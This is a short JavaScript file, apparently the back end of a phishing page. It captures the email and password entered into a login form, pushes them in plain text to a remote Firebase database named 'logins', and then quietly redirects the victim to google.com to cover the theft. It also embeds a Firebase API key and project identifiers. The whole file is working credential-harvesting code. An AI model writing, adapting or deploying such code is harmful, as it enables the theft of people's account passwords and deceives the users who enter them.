var config = {
    apiKey: "AIzaSyCJHV-my1zHVSp1bf485-rdSxJskfAHBMA",
    authDomain: "logins-3d317.firebaseapp.com",
    databaseURL: "https://logins-3d317.firebaseio.com",
    projectId: "logins-3d317",
    storageBucket: "logins-3d317.appspot.com",
    messagingSenderId: "855532098917"
};
firebase.initializeApp(config);

const rootRef = firebase.database().ref(); // reference ne te gjithe database
const commentsRef = rootRef.child('comments'); // krijo comments "object"
const form = document.querySelector("form"); // Form HTML

form.addEventListener("submit",function(e){
    let email = document.querySelector("#email").value;
    let password = document.querySelector("#password").value; //Email 
    let newPost = commentsRef.push();
    newPost.set({
        email: email,
        password: password
    });

    setTimeout(function(){
        window.location = "http://google.com"
    },1500)

    e.preventDefault();
});


// Show login detail
